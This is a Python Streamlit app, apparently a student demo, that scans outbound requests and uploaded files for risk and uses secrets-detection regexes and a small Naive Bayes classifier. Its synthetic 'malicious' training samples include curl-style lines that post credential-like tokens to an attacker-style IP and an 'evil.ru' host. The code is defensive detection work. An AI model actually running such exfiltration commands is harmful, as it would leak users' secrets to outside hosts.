# app.py
# -----------------------------------------------------------
# Cyber AI Guard (Web) — a demo-grade, fully functional app
# -----------------------------------------------------------
# Features:
# - Smart Dashboard with metrics & charts
# - "Packet Guard" for analyzing outbound requests/payloads
# - "File Scanner" for heuristic scanning of uploaded files
# - "Smart Memory" with persistent JSON storage (allow/block lists, notes)
# - Lightweight "Learning" via a simple Naive Bayes classifier (pure Python)
# - Logs & Reports saved in SQLite + export to HTML/CSV/JSON
# - Premium UI styling, icons, and rich interactions
#
# How to run locally:
#   streamlit run app.py
#
# On Render:
#   - Use this repo with requirements.txt
#   - Start command: streamlit run app.py --server.port $PORT --server.address 0.0.0.0
# -----------------------------------------------------------

import os
import re
import io
import json
import math
import time
import base64
import zlib
import hashlib
import zipfile
import random
import sqlite3
import textwrap
from pathlib import Path
from datetime import datetime
from collections import defaultdict, Counter

import numpy as np
import pandas as pd
import matplotlib.pyplot as plt
import streamlit as st
from streamlit_option_menu import option_menu

# -----------------------------
# App & Theme Config
# -----------------------------
st.set_page_config(
    page_title="Cyber AI Guard",
    page_icon="🛡️",
    layout="wide",
    menu_items={
        "Get Help": "https://docs.streamlit.io/",
        "About": "Cyber AI Guard — Demo-grade cyber assistant for your FYP."
    }
)

# ---- Custom CSS (premium glassy look + animations)
CUSTOM_CSS = """
<style>
/* Global */
:root {
  --bg: #0b0f19;
  --card: #12192d;
  --accent: linear-gradient(135deg, #8a5cff 0%, #2db2ff 100%);
  --text: #e7ecff;
  --muted: #aab3d1;
  --ok: #20c997;
  --warn: #ffb020;
  --bad: #ff5c5c;
}
html, body, [data-testid="stAppViewContainer"] {
  background: radial-gradient(1200px 800px at 80% -20%, rgba(45,178,255,0.12) 0%, rgba(0,0,0,0) 50%),
              radial-gradient(1000px 600px at -10% 20%, rgba(138,92,255,0.10) 0%, rgba(0,0,0,0) 45%),
              var(--bg);
  color: var(--text);
}
h1, h2, h3 { color: var(--text); letter-spacing: .3px; }
.small { color: var(--muted); font-size: 0.9rem; }
.caption { color: var(--muted); font-size: 0.8rem; }
.kbd {background:#1e2742;border:1px solid #2f3a5d;padding:2px 6px;border-radius:6px;font-size:0.8rem}

/* Top hero card */
.hero {
  border-radius: 24px;
  padding: 22px 26px;
  background:
    linear-gradient( to right, rgba(138,92,255,.08), rgba(45,178,255,.08) ),
    #0f1630;
  border: 1px solid rgba(255,255,255,0.06);
  box-shadow: 0 12px 30px rgba(0,0,0,0.3), inset 0 1px 0 rgba(255,255,255,0.03);
}
.hero-title {
  font-size: 1.45rem;
  font-weight: 700;
  margin: 0 0 6px 0;
  background: var(--accent);
  -webkit-background-clip: text;
  -webkit-text-fill-color: transparent;
}
.hero-sub {
  color: var(--muted);
}

/* Metric cards */
.metric-card {
  border-radius: 18px;
  padding: 14px 16px;
  background: #11172c;
  border: 1px solid rgba(255,255,255,0.06);
  box-shadow: 0 10px 24px rgba(0,0,0,0.25);
}
.metric-label { color: #a3afd6; font-size: .85rem; }
.metric-value { font-size: 1.6rem; font-weight: 800; }

/* Severity pills */
.pill { display:inline-block; padding:4px 10px; border-radius:999px; font-size:.8rem; font-weight:700 }
.pill-ok { background:rgba(32,201,151,.14); color:#57e3bf; border:1px solid rgba(32,201,151,.35) }
.pill-warn { background:rgba(255,176,32,.12); color:#ffd48a; border:1px solid rgba(255,176,32,.3) }
.pill-bad { background:rgba(255,92,92,.12); color:#ff9da0; border:1px solid rgba(255,92,92,.3) }

/* Cards/expanders */
.block {
  background:#10162a;
  border:1px solid rgba(255,255,255,.06);
  border-radius:18px;
  padding:16px;
}
.summary {
  background:linear-gradient(135deg, rgba(138,92,255,.08), rgba(45,178,255,.08));
  border:1px dashed rgba(255,255,255,.12);
  border-radius:16px; padding:12px 14px; margin-top:6px;
}

/* Buttons */
.stButton>button {
  background: var(--accent)!important;
  color: white!important;
  border:none;
  border-radius: 12px;
  padding: 10px 16px;
  font-weight: 700;
  box-shadow: 0 10px 22px rgba(45,178,255,.2);
}
.stDownloadButton>button {
  border-radius: 12px;
}

/* Tables */
.dataframe, .stDataFrame {
  border-radius: 12px;
  overflow: hidden;
}

/* Hide default Streamlit footer */
footer {visibility: hidden;}
</style>
"""
st.markdown(CUSTOM_CSS, unsafe_allow_html=True)

# -----------------------------
# Paths & basic storage
# -----------------------------
BASE_DIR = Path(".")
DATA_DIR = BASE_DIR / "data"
DATA_DIR.mkdir(exist_ok=True)
DB_PATH = DATA_DIR / "ai_guard.db"
MEMORY_PATH = DATA_DIR / "memory.json"

# -----------------------------
# Utilities
# -----------------------------
def now_iso() -> str:
    return datetime.utcnow().replace(microsecond=0).isoformat() + "Z"

def sha256_bytes(b: bytes) -> str:
    return hashlib.sha256(b).hexdigest()

def entropy(s: str) -> float:
    if not s:
        return 0.0
    p, lns = Counter(s), float(len(s))
    return -sum(count/lns * math.log2(count/lns) for count in p.values())

def clamp(v, lo, hi):
    return max(lo, min(hi, v))

def color_pill(sev: int) -> str:
    if sev >= 75: return '<span class="pill pill-bad">HIGH</span>'
    if sev >= 40: return '<span class="pill pill-warn">MEDIUM</span>'
    return '<span class="pill pill-ok">LOW</span>'

# -----------------------------
# Persistent Memory
# -----------------------------
DEFAULT_MEMORY = {
    "notes": [],
    "allowlist_domains": ["localhost", "127.0.0.1"],
    "blocklist_domains": [],
    "suspicious_tlds": [".ru", ".cn", ".top", ".xyz", ".zip", ".mov"],
    "secrets_regex": [
        r"AKIA[0-9A-Z]{16}",  # AWS Access Key ID
        r"(?i)aws(.{0,20})?(secret|access).{0,20}?=[^\s\"']{20,}",
        r"AIza[0-9A-Za-z\-_]{35}",  # Google API key
        r"xox[baprs]-[0-9]{10,}-[0-9]{10,}-[0-9A-Za-z]{24,}",  # Slack token
        r"-----BEGIN (RSA|DSA|EC|OPENSSH) PRIVATE KEY-----",
        r"eyJ[0-9A-Za-z_\-]+?\.[0-9A-Za-z_\-]+?\.[0-9A-Za-z_\-]+",  # JWT
    ],
    "pii_regex": [
        r"(?i)\b[A-Z0-9._%+-]+@[A-Z0-9.-]+\.[A-Z]{2,}\b",  # emails
        r"\b(?:\+?\d{1,3}[-.\s]?)?(?:\d{3}[-.\s]?){2}\d{4}\b",   # phones
    ],
    "learning": {
        "classes": ["safe", "malicious"],
        "word_counts": {},            # label -> {word: count}
        "label_counts": {},           # label -> example count
        "vocab": [],                  # list of words
        "total_words_per_label": {}   # label -> total word count
    }
}

def load_memory():
    if MEMORY_PATH.exists():
        try:
            with open(MEMORY_PATH, "r", encoding="utf-8") as f:
                return json.load(f)
        except Exception:
            pass
    return DEFAULT_MEMORY.copy()

def save_memory(mem: dict):
    with open(MEMORY_PATH, "w", encoding="utf-8") as f:
        json.dump(mem, f, indent=2)

MEM = load_memory()

# -----------------------------
# SQLite Logging
# -----------------------------
def init_db():
    con = sqlite3.connect(DB_PATH)
    cur = con.cursor()
    cur.execute("""
    CREATE TABLE IF NOT EXISTS events (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        ts TEXT NOT NULL,
        type TEXT NOT NULL,     -- packet|file|learning|system
        subject TEXT NOT NULL,  -- url|filename|note
        severity INTEGER NOT NULL,
        summary TEXT NOT NULL,
        details TEXT NOT NULL
    )
    """)
    con.commit()
    con.close()

def log_event(ev_type: str, subject: str, severity: int, summary: str, details: dict):
    con = sqlite3.connect(DB_PATH)
    cur = con.cursor()
    cur.execute(
        "INSERT INTO events (ts, type, subject, severity, summary, details) VALUES (?, ?, ?, ?, ?, ?)",
        (now_iso(), ev_type, subject, int(severity), summary, json.dumps(details))
    )
    con.commit()
    con.close()

def fetch_events(limit: int = 500):
    con = sqlite3.connect(DB_PATH)
    df = pd.read_sql_query(
        f"SELECT id, ts, type, subject, severity, summary, details FROM events ORDER BY id DESC LIMIT {int(limit)}",
        con
    )
    con.close()
    return df

init_db()

# -----------------------------
# Naive Bayes (lightweight)
# -----------------------------
TOKEN_RE = re.compile(r"[A-Za-z0-9_]{2,}")

def tokenize(text: str):
    return TOKEN_RE.findall((text or "").lower())

class TinyNB:
    def __init__(self, state=None):
        if state is None:
            self.labels = ["safe", "malicious"]
            self.word_counts = defaultdict(lambda: defaultdict(int))
            self.label_counts = defaultdict(int)
            self.total_words = defaultdict(int)
            self.vocab = set()
        else:
            self.labels = state.get("classes", ["safe", "malicious"])
            self.word_counts = defaultdict(lambda: defaultdict(int))
            for lbl, wc in state.get("word_counts", {}).items():
                for w, c in wc.items():
                    self.word_counts[lbl][w] = int(c)
            self.label_counts = defaultdict(int, {k:int(v) for k,v in state.get("label_counts", {}).items()})
            self.total_words = defaultdict(int, {k:int(v) for k,v in state.get("total_words_per_label", {}).items()})
            self.vocab = set(state.get("vocab", []))

    def add(self, text, label):
        words = tokenize(text)
        for w in words:
            self.word_counts[label][w] += 1
            self.total_words[label] += 1
            self.vocab.add(w)
        self.label_counts[label] += 1

    def predict(self, text):
        words = tokenize(text)
        total_docs = sum(self.label_counts.values()) or 1
        scores = {}
        V = max(len(self.vocab), 1)
        for lbl in self.labels:
            prior = math.log((self.label_counts[lbl] + 1) / (total_docs + len(self.labels)))
            likelihood = 0.0
            denom = self.total_words[lbl] + V
            for w in words:
                c = self.word_counts[lbl][w]
                likelihood += math.log((c + 1) / denom)
            scores[lbl] = prior + likelihood
        # softmax-like
        m = max(scores.values())
        exps = {k: math.exp(v - m) for k,v in scores.items()}
        Z = sum(exps.values()) or 1
        probs = {k: exps[k]/Z for k in exps}
        label = max(probs, key=probs.get)
        return label, probs

    def to_state(self):
        return {
            "classes": self.labels,
            "word_counts": {lbl: dict(d) for lbl, d in self.word_counts.items()},
            "label_counts": dict(self.label_counts),
            "vocab": list(self.vocab),
            "total_words_per_label": dict(self.total_words),
        }

NB = TinyNB(MEM.get("learning"))

def persist_nb():
    MEM["learning"] = NB.to_state()
    save_memory(MEM)

# -----------------------------
# Packet Guard
# -----------------------------
URL_RE = re.compile(r"(?i)\b((?:https?://)?[A-Za-z0-9\-\._:]+(?:/[^\s]*)?)\b")
HOST_RE = re.compile(r"(?i)^(?:https?://)?([^/:]+)")

def parse_curl(cmd: str):
    """
    Very forgiving cURL parser for quick demos.
    Supports: url, -X METHOD, -H, --data/--data-raw/--data-binary
    """
    url = None
    method = "GET"
    headers = {}
    data = ""
    if "curl " not in cmd:
        return None

    # URL (first token that looks like a URL)
    m = URL_RE.search(cmd)
    if m:
        url = m.group(1)

    # Method
    m = re.search(r"-X\s+([A-Z]+)", cmd)
    if m:
        method = m.group(1).upper()

    # Headers
    for h in re.findall(r"-H\s+'([^']+)'|-H\s+\"([^\"]+)\"", cmd):
        hv = h[0] or h[1]
        if ":" in hv:
            k, v = hv.split(":", 1)
            headers[k.strip()] = v.strip()

    # Data
    m = re.search(r"--data(?:-raw|-binary)?\s+'([^']*)'|--data(?:-raw|-binary)?\s+\"([^\"]*)\"", cmd, re.S)
    if m:
        data = m.group(1) or m.group(2) or ""
    return {"url": url, "method": method, "headers": headers, "data": data}

def analyze_payload_for_secrets(text: str):
    findings = []
    for rx in MEM.get("secrets_regex", []):
        for m in re.findall(rx, text or "", flags=re.I):
            snippet = m if isinstance(m, str) else m[0]
            findings.append({"type":"secret", "regex": rx, "match": str(snippet)[:60]})
    # entropy spikes
    candidates = re.findall(r"[A-Za-z0-9/+_=]{28,}", text or "")
    for c in candidates[:50]:
        e = entropy(c)
        if e > 4.2:
            findings.append({"type":"high-entropy", "score": round(e,2), "sample": c[:50] + ("…" if len(c)>50 else "")})
    # PII
    for rx in MEM.get("pii_regex", []):
        for m in re.findall(rx, text or "", flags=re.I):
            snippet = m if isinstance(m, str) else m[0]
            findings.append({"type":"pii", "regex": rx, "match": str(snippet)[:60]})
    return findings

def domain_from_url(url: str):
    if not url:
        return ""
    m = HOST_RE.search(url.strip())
    return (m.group(1) if m else "").lower()

def tld(domain: str):
    i = domain.rfind(".")
    return domain[i:].lower() if i != -1 else ""

def analyze_packet(url: str, method: str, payload: str):
    method = (method or "GET").upper()
    domain = domain_from_url(url)
    scheme = "https" if url.lower().startswith("https") else ("http" if url.lower().startswith("http") else "unknown")

    findings = []
    score = 0

    # Transport checks
    if scheme == "http":
        findings.append(("Insecure protocol (HTTP)", 25))
        score += 25
    if re.match(r"^\d{1,3}(\.\d{1,3}){3}$", domain):
        findings.append(("Direct IP address used (no domain)", 10))
        score += 10

    td = tld(domain)
    if td in MEM.get("suspicious_tlds", []):
        findings.append((f"Suspicious TLD detected: {td}", 20))
        score += 20

    if domain and (domain not in MEM.get("allowlist_domains", [])):
        # Non-allowlisted domain mildly penalized
        findings.append((f"Domain not in allowlist: {domain}", 10))
        score += 10

    # Payload checks (secrets / PII / high-entropy)
    secret_hits = analyze_payload_for_secrets(payload or "")
    if secret_hits:
        findings.append((f"Potential secrets/PII found: {len(secret_hits)}", 30))
        score += 30

    # Model inference
    label, probs = NB.predict((url or "") + " " + (payload or ""))
    ml_boost = int(round(probs.get("malicious", 0.0) * 25))
    if ml_boost:
        findings.append((f"ML suggests risk (p_malicious={probs.get('malicious',0):.2f})", ml_boost))
        score += ml_boost

    # Final severity clamp
    sev = clamp(score, 0, 100)
    details = {
        "url": url, "method": method, "domain": domain, "scheme": scheme,
        "findings": findings, "secret_hits": secret_hits, "ml_probs": probs, "score": sev
    }
    summary = f"{method} {domain or url} — risk {sev}/100"
    log_event("packet", url or "(no-url)", sev, summary, details)
    return sev, findings, details

# -----------------------------
# File Scanner
# -----------------------------
DANGEROUS_PERMS = [
    "READ_SMS","SEND_SMS","RECEIVE_SMS","READ_CALL_LOG","WRITE_CALL_LOG","RECORD_AUDIO",
    "READ_CONTACTS","WRITE_CONTACTS","READ_EXTERNAL_STORAGE","WRITE_EXTERNAL_STORAGE",
    "SYSTEM_ALERT_WINDOW","REQUEST_INSTALL_PACKAGES","WRITE_SETTINGS"
]
ARCHIVE_EXEC_EXT = [".exe",".js",".vbs",".scr",".bat",".cmd",".ps1",".apk",".dex",".sh",".elf"]

def scan_pdf(buf: bytes, heur: list):
    # Look for JS & auto-exec actions
    s = buf[:2_000_000]  # cap for speed
    hit = False
    for token in [b"/JS", b"/JavaScript", b"/OpenAction", b"/AA", b"/Launch"]:
        if token in s:
            heur.append(f"PDF contains {token.decode('latin1')} — possible active content")
            hit = True
    return 20 if hit else 0

def scan_office(ext: str, heur: list):
    if ext.endswith("m"):  # docm, xlsm, pptm
        heur.append("Office file with macros-enabled extension detected")
        return 25
    return 0

def scan_pe(buf: bytes, heur: list):
    if buf.startswith(b"MZ"):
        heur.append("Windows PE executable detected (MZ header)")
        return 35
    return 0

def scan_zip(name: str, buf: bytes, heur: list):
    score = 0
    try:
        with zipfile.ZipFile(io.BytesIO(buf), "r") as z:
            names = z.namelist()
            # Flag clearly executable content
            flagged_inside = [n for n in names if any(n.lower().endswith(e) for e in ARCHIVE_EXEC_EXT)]
            if flagged_inside:
                heur.append(f"Archive contains executable-like files: {', '.join(flagged_inside[:5])}" + ("…" if len(flagged_inside)>5 else ""))
                score += 25

            # APK heuristics (very light)
            if name.lower().endswith(".apk"):
                joined = ""
                for n in names[:50]:
                    if any(x in n for x in ["AndroidManifest.xml","classes.dex","resources.arsc","lib/"]):
                        joined += n + " "
                # peek bytes to find permission strings
                sniffed_perms = set()
                for n in names:
                    if n.endswith((".xml",".txt",".cfg",".properties",".json",".dex","AndroidManifest.xml","resources.arsc")):
                        try:
                            b = z.read(n)
                            for p in DANGEROUS_PERMS:
                                if p.encode() in b:
                                    sniffed_perms.add(p)
                        except Exception:
                            pass
                    if len(sniffed_perms) > 12:  # cap scanning
                        break
                if sniffed_perms:
                    heur.append("APK requests sensitive permissions: " + ", ".join(sorted(sniffed_perms)))
                    score += 30
    except Exception as e:
        heur.append(f"Archive parse error: {e}")
        score += 5
    return score

def scan_text_for_secrets(name: str, text: str, heur: list):
    hits = analyze_payload_for_secrets(text or "")
    if hits:
        heur.append(f"Possible secrets/PII in {name}: {len(hits)} hit(s)")
        return 20
    return 0

def scan_file(uploaded_file):
    raw = uploaded_file.read()
    name = uploaded_file.name
    size = len(raw)
    h = sha256_bytes(raw)
    ext = name.lower().split(".")[-1] if "." in name else ""

    heur = []
    score = 0

    # Type-specific heuristics
    if ext in ["pdf"]:
        score += scan_pdf(raw, heur)
    elif ext in ["doc","docx","xls","xlsx","ppt","pptx","docm","xlsm","pptm"]:
        score += scan_office(ext, heur)
    elif ext in ["exe","dll","scr","com","bin"]:
        score += scan_pe(raw, heur)
    elif ext in ["zip","apk","jar"]:
        score += scan_zip(name, raw, heur)

    # Generic checks
    if size > 40_000_000:
        heur.append("Large file (>40MB) — be cautious")
        score += 5

    # try textual secret scan for small files
    try:
        if size < 2_000_000:
            text_preview = raw.decode("utf-8", errors="ignore")
            score += scan_text_for_secrets(name, text_preview, heur)
    except Exception:
        pass

    sev = clamp(score, 0, 100)
    details = {"name": name, "size": size, "sha256": h, "heuristics": heur, "score": sev}
    summary = f"{name} — risk {sev}/100"
    log_event("file", name, sev, summary, details)
    return sev, heur, details

# -----------------------------
# Report Generation
# -----------------------------
def render_events_table(limit=300):
    df = fetch_events(limit=limit)
    if df.empty:
        st.info("No events logged yet.")
        return df
    # Pretty severity
    df_show = df.copy()
    df_show["severityPill"] = df_show["severity"].apply(
        lambda s: f"{s} | " + ("HIGH" if s>=75 else "MEDIUM" if s>=40 else "LOW")
    )
    st.dataframe(df_show[["id","ts","type","subject","severityPill","summary"]], use_container_width=True, hide_index=True)
    return df

def events_to_html(df: pd.DataFrame) -> str:
    rows = []
    for _, r in df.iterrows():
        sev_html = color_pill(int(r["severity"]))
        rows.append(f"""
        <tr>
          <td>{int(r['id'])}</td>
          <td>{r['ts']}</td>
          <td>{r['type']}</td>
          <td>{r['subject']}</td>
          <td>{sev_html}</td>
          <td>{r['summary']}</td>
        </tr>
        """)
    return f"""
    <html><head><meta charset="utf-8">
    <style>
      body{{font-family:system-ui,Segoe UI,Roboto,Inter,Arial;background:#0b0f19;color:#e7ecff;padding:24px}}
      table{{width:100%;border-collapse:collapse;border:1px solid #2f3a5d}}
      th,td{{padding:10px;border-bottom:1px solid #2f3a5d;text-align:left}}
      .pill{{display:inline-block;padding:4px 10px;border-radius:999px;font-size:.8rem;font-weight:700}}
      .pill-ok{{background:rgba(32,201,151,.14);color:#57e3bf;border:1px solid rgba(32,201,151,.35)}}
      .pill-warn{{background:rgba(255,176,32,.12);color:#ffd48a;border:1px solid rgba(255,176,32,.3)}}
      .pill-bad{{background:rgba(255,92,92,.12);color:#ff9da0;border:1px solid rgba(255,92,92,.3)}}
    </style></head><body>
    <h2>Cyber AI Guard — Report</h2>
    <p>Generated: {now_iso()}</p>
    <table>
      <thead><tr><th>ID</th><th>Time (UTC)</th><th>Type</th><th>Subject</th><th>Severity</th><th>Summary</th></tr></thead>
      <tbody>{"".join(rows)}</tbody>
    </table>
    </body></html>
    """

# -----------------------------
# Sidebar Navigation
# -----------------------------
with st.sidebar:
    st.markdown("### 🛡️ Cyber AI Guard")
    st.caption("Android concept → Web demo")
    choice = option_menu(
        "Navigate",
        ["Dashboard", "Packet Guard", "File Scanner", "Smart Memory", "Learning", "Logs & Reports", "Settings / About"],
        icons=["speedometer","cloud-upload","file-earmark-check","database","cpu","list-check","gear"],
        default_index=0,
        styles={
            "nav-link": {"font-size": "14px", "margin":"2px", "--hover-color": "#0f1630"},
            "nav-link-selected": {"background": "linear-gradient(135deg, #8a5cff66, #2db2ff66)"},
        }
    )
    st.markdown("<br>", unsafe_allow_html=True)
    st.markdown('<span class="small">Tip: paste a <span class="kbd">curl …</span> in Packet Guard for instant analysis.</span>', unsafe_allow_html=True)

# -----------------------------
# Hero
# -----------------------------
st.markdown("""
<div class="hero">
  <div class="hero-title">Cyber AI Guard</div>
  <div class="hero-sub">AI-assisted security companion — scans outbound requests, inspects new files, remembers context, and adapts with lightweight learning.</div>
</div>
""", unsafe_allow_html=True)
st.markdown("")

# -----------------------------
# DASHBOARD
# -----------------------------
if choice == "Dashboard":
    # Metrics row
    df = fetch_events(limit=1000)
    total_events = int(df.shape[0]) if not df.empty else 0
    high_events = int((df["severity"]>=75).sum()) if not df.empty else 0
    med_events = int(((df["severity"]>=40)&(df["severity"]<75)).sum()) if not df.empty else 0
    last = df.iloc[0]["summary"] if not df.empty else "—"

    c1, c2, c3, c4 = st.columns(4)
    with c1:
        st.markdown('<div class="metric-card"><div class="metric-label">Events</div><div class="metric-value">📈 {}</div></div>'.format(total_events), unsafe_allow_html=True)
    with c2:
        st.markdown('<div class="metric-card"><div class="metric-label">High Risk</div><div class="metric-value">🔥 {}</div></div>'.format(high_events), unsafe_allow_html=True)
    with c3:
        st.markdown('<div class="metric-card"><div class="metric-label">Medium Risk</div><div class="metric-value">⚠️ {}</div></div>'.format(med_events), unsafe_allow_html=True)
    with c4:
        st.markdown('<div class="metric-card"><div class="metric-label">Last Event</div><div class="metric-value">🕒</div><div class="small">{}</div></div>'.format(last[:48]+"…" if len(last)>48 else last), unsafe_allow_html=True)

    st.markdown("#### Trend")
    if df.empty:
        st.info("No data yet. Run a scan in **Packet Guard** or **File Scanner**.")
    else:
        # Simple risk distribution chart
        fig, ax = plt.subplots()
        ax.hist(df["severity"], bins=[0,20,40,60,80,100])
        ax.set_title("Severity Distribution")
        ax.set_xlabel("Severity")
        ax.set_ylabel("Count")
        st.pyplot(fig, use_container_width=True)

    st.markdown("#### Recent Activity")
    render_events_table(limit=15)

    with st.expander("Quick Actions"):
        qc1, qc2, qc3 = st.columns(3)
        with qc1:
            if st.button("Simulate Safe GET"):
                sev, _, _ = analyze_packet("https://api.github.com", "GET", "")
                st.success(f"Logged simulated GET (sev={sev})")
        with qc2:
            if st.button("Simulate Risky POST"):
                sev, _, _ = analyze_packet("http://198.51.100.10/login", "POST", "user=admin&pass=AKIA1234567890TEST")
                st.warning(f"Logged simulated POST (sev={sev})")
        with qc3:
            st.caption("Upload a file in **File Scanner** to populate logs.")

# -----------------------------
# PACKET GUARD
# -----------------------------
elif choice == "Packet Guard":
    st.subheader("Outbound Request Analyzer")
    st.caption("Paste a URL + payload or drop in a `curl` command.")

    curl_txt = st.text_area("cURL (optional)", placeholder="curl -X POST https://api.example.com/login -H 'Content-Type: application/json' --data '{\"email\":\"a@b.com\",\"key\":\"AKIA...\"}'", height=120)
    url = st.text_input("URL", placeholder="https://api.example.com/endpoint")
    method = st.selectbox("Method", ["GET","POST","PUT","PATCH","DELETE","HEAD","OPTIONS"], index=0)
    payload = st.text_area("Payload / Body (optional)", height=120, placeholder='{"email":"user@example.com","token":"..."}')

    colA, colB = st.columns([1,1])
    with colA:
        use_nb = st.checkbox("Use Learning signal (NB)", value=True)
    with colB:
        st.caption("Allowlist domains: " + ", ".join(MEM.get("allowlist_domains", [])[:6]) + ("…" if len(MEM.get("allowlist_domains", []))>6 else ""))

    if curl_txt.strip():
        parsed = parse_curl(curl_txt)
        if parsed:
            if not url and parsed.get("url"): url = parsed["url"]
            if method == "GET" and parsed.get("method"): method = parsed["method"]
            if not payload and parsed.get("data"): payload = parsed["data"]

    if st.button("Analyze Request"):
        with st.spinner("Scanning…"):
            sev, findings, details = analyze_packet(url, method, payload)
            time.sleep(0.4)

        st.markdown(f"### Result: {color_pill(sev)} (score {sev}/100)", unsafe_allow_html=True)
        st.markdown('<div class="summary">', unsafe_allow_html=True)
        for text, pts in details["findings"]:
            st.markdown(f"- **{text}** (+{pts})")
        st.markdown("</div>", unsafe_allow_html=True)

        if details["secret_hits"]:
            with st.expander("Potential Secrets / PII"):
                st.json(details["secret_hits"])

        with st.expander("Raw Details"):
            st.json(details)

# -----------------------------
# FILE SCANNER
# -----------------------------
elif choice == "File Scanner":
    st.subheader("Incoming File Inspector")
    st.caption("Upload files; we compute hashes and run heuristic checks (PDF JS, Office macros, PE, archives/APK, secrets).")

    files = st.file_uploader("Upload one or more files", type=None, accept_multiple_files=True)
    if files:
        for f in files:
            st.markdown(f"#### 📄 {f.name}")
            with st.spinner("Scanning…"):
                sev, heur, details = scan_file(f)
                time.sleep(0.3)

            st.markdown(f"**Severity:** {color_pill(sev)} (score {sev}/100)", unsafe_allow_html=True)
            if heur:
                st.markdown("**Heuristics**")
                for h in heur:
                    st.markdown(f"- {h}")
            with st.expander("Details"):
                st.json(details)

            # One-click per-file mini report
            html = f"""
            <h3>File Scan Report</h3>
            <p><b>Name:</b> {details['name']}<br>
            <b>SHA256:</b> {details['sha256']}<br>
            <b>Size:</b> {details['size']} bytes<br>
            <b>Risk:</b> {details['score']}/100</p>
            <ul>{"".join(f"<li>{h}</li>" for h in details["heuristics"])}</ul>
            """
            b = html.encode("utf-8")
            st.download_button(
                "Download HTML Report",
                data=b,
                file_name=f"{Path(details['name']).stem}_report.html",
                mime="text/html"
            )

# -----------------------------
# SMART MEMORY
# -----------------------------
elif choice == "Smart Memory":
    st.subheader("Persistent Memory")
    st.caption("Allow/block domains, store notes, and configure scanners. Persisted in `data/memory.json`.")

    tabs = st.tabs(["Allow / Block Lists", "Notes", "Regex (Secrets & PII)"])
    with tabs[0]:
        c1, c2 = st.columns(2)
        with c1:
            st.markdown("**Allowlist Domains**")
            allow = st.text_area("Comma-separated", value=",".join(MEM.get("allowlist_domains", [])))
            if st.button("Save Allowlist"):
                MEM["allowlist_domains"] = [d.strip().lower() for d in allow.split(",") if d.strip()]
                save_memory(MEM)
                st.success("Saved.")
        with c2:
            st.markdown("**Suspicious TLDs**")
            tlds = st.text_area("Comma-separated", value=",".join(MEM.get("suspicious_tlds", [])))
            if st.button("Save TLDs"):
                MEM["suspicious_tlds"] = [t.strip().lower() for t in tlds.split(",") if t.strip().startswith(".")]
                save_memory(MEM)
                st.success("Saved.")

        st.divider()
        st.markdown("**Blocklist Domains**")
        block = st.text_area("Comma-separated", value=",".join(MEM.get("blocklist_domains", [])))
        if st.button("Save Blocklist"):
            MEM["blocklist_domains"] = [d.strip().lower() for d in block.split(",") if d.strip()]
            save_memory(MEM)
            st.success("Saved.")

    with tabs[1]:
        st.markdown("**Quick Notes**")
        note = st.text_area("Add a note")
        if st.button("Add Note"):
            MEM["notes"].append({"ts": now_iso(), "text": note})
            save_memory(MEM)
            st.success("Added.")
        if MEM.get("notes"):
            for n in reversed(MEM["notes"][-20:]):
                st.markdown(f"- {n['ts']}: {n['text']}")

    with tabs[2]:
        st.markdown("**Secrets Regex**")
        sec = st.text_area("One regex per line", value="\n".join(MEM.get("secrets_regex", [])), height=160)
        st.markdown("**PII Regex**")
        pii = st.text_area("One regex per line", value="\n".join(MEM.get("pii_regex", [])), height=120)
        if st.button("Save Regex"):
            MEM["secrets_regex"] = [r.strip() for r in sec.splitlines() if r.strip()]
            MEM["pii_regex"] = [r.strip() for r in pii.splitlines() if r.strip()]
            save_memory(MEM)
            st.success("Saved.")

# -----------------------------
# LEARNING
# -----------------------------
elif choice == "Learning":
    st.subheader("Adaptive Learning (Naive Bayes)")
    st.caption("Add samples and labels. The classifier influences Packet Guard scoring slightly.")

    s1, s2 = st.columns([3,1])
    with s1:
        text = st.text_area("Sample text (e.g., request payload, URL, log snippet)", height=120)
    with s2:
        label = st.radio("Label", ["safe","malicious"], horizontal=True)

    train_col, gen_col = st.columns([1,1])
    with train_col:
        if st.button("Add Training Sample"):
            NB.add(text or "", label)
            persist_nb()
            log_event("learning","sample", 0, f"Added {label} sample", {"text": text})
            st.success("Sample added.")
    with gen_col:
        st.caption("Need data?")
        if st.button("Generate 4 synthetic samples"):
            synthetics = [
                ("POST http://login.evil.ru with token=AIza" + "X"*30, "malicious"),
                ("GET https://api.github.com/users?since=0", "safe"),
                ("curl -X POST http://203.0.113.55/upload --data 'key=AKIA123...'", "malicious"),
                ("GET https://yourdomain.com/health", "safe"),
            ]
            for txt, lab in synthetics:
                NB.add(txt, lab)
            persist_nb()
            log_event("learning","synthetic", 0, "Generated 4 samples", {})
            st.success("Added 4 samples.")

    st.divider()
    st.markdown("**Test Prediction**")
    test_txt = st.text_area("Text to classify", height=100)
    if st.button("Predict"):
        lbl, probs = NB.predict(test_txt or "")
        st.markdown(f"**Prediction:** `{lbl}`")
        st.json({k: round(v,3) for k,v in probs.items()})

# -----------------------------
# LOGS & REPORTS
# -----------------------------
elif choice == "Logs & Reports":
    st.subheader("Security Events")
    df = render_events_table(limit=500)

    if not df.empty:
        c1, c2, c3 = st.columns([1,1,1])
        with c1:
            csv = df.to_csv(index=False).encode("utf-8")
            st.download_button("Download CSV", csv, "events.csv", "text/csv")
        with c2:
            js = df.to_json(orient="records").encode("utf-8")
            st.download_button("Download JSON", js, "events.json", "application/json")
        with c3:
            html = events_to_html(df).encode("utf-8")
            st.download_button("Download HTML Report", html, "report.html", "text/html")

# -----------------------------
# SETTINGS / ABOUT
# -----------------------------
elif choice == "Settings / About":
    st.subheader("About this App")
    st.markdown("""
**Cyber AI Guard (Web)** is a streamlined, demo-friendly implementation of your Android concept.

- 🔐 *Packet Guard:* Checks protocol, domain/TLD, allowlist, secrets/PII, entropy spikes, and NB signal  
- 📂 *File Scanner:* Heuristics for PDFs, Office macros, PE, archives/APK, and secret patterns  
- 🧠 *Memory:* Persist allow/block lists, regexes, notes  
- 🧪 *Learning:* Tiny Naive Bayes affects risk scoring  
- 🗂️ *Logs:* SQLite-based, exportable reports

**Local paths**
- Database: `data/ai_guard.db`  
- Memory: `data/memory.json`

**Deploy on Render**
- Build Command: *(leave blank or default)*  
- Start Command: streamlit run app.py --server.port $PORT --server.address 0.0.0.0
    """)
st.info("Note: Heuristics are conservative by design and intended for demonstration/education, not a replacement for full malware analysis.")
